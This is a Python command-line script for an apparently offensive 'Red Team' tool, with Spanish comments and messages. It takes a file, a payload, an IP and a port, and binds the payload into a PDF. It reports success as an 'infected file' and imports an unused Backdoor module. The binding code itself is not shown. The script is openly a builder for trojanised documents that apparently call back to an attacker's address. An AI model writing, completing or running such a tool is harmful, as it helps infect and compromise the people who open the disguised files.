import os
import sys
from core.binder import FileBinder
from core.backdoor import Backdoor
import argparse

def main():
    parser = argparse.ArgumentParser(description="Herramienta de Red Team")
    subparsers = parser.add_subparsers(dest="command", required=True)

    # Parser para 'bind'
    bind_parser = subparsers.add_parser("bind", help="Bind payload a archivo")
    bind_parser.add_argument("--file", required=True, help="Archivo original")
    bind_parser.add_argument("--payload", required=True, help="Payload a incrustar")
    bind_parser.add_argument("--output", required=True, help="Archivo de salida")
    bind_parser.add_argument("--ip", required=True, help="IP para conexión")
    bind_parser.add_argument("--port", type=int, required=True, help="Puerto para conexión")
    bind_parser.add_argument("--debug", action="store_true", help="Modo verbose")

    args = parser.parse_args()

    if args.command == "bind":
        try:
            # Validar que los archivos existen
            if not os.path.isfile(args.file):
                raise FileNotFoundError(f"No existe el archivo: {args.file}")
            if not os.path.isfile(args.payload):
                raise FileNotFoundError(f"No existe el payload: {args.payload}")

            # Lógica de binding
            if args.file.endswith(".pdf"):
                # Pasar el path del payload directamente, no su contenido
                success = FileBinder.bind_to_pdf(args.file, args.payload, args.output, args.debug)
                if success:
                    print(f"[+] Archivo infectado creado en: {args.output}")
                else:
                    raise RuntimeError("No se pudo crear el archivo infectado")
            elif args.file.endswith((".png", ".jpg")):
                raise NotImplementedError("Soporte para imágenes no implementado")
            else:
                raise ValueError("Formato no soportado")

        except Exception as e:
            print(f"[ERROR] {str(e)}", file=sys.stderr)
            if args.debug:
                import traceback
                traceback.print_exc()
            sys.exit(1)

if __name__ == "__main__":
    main()
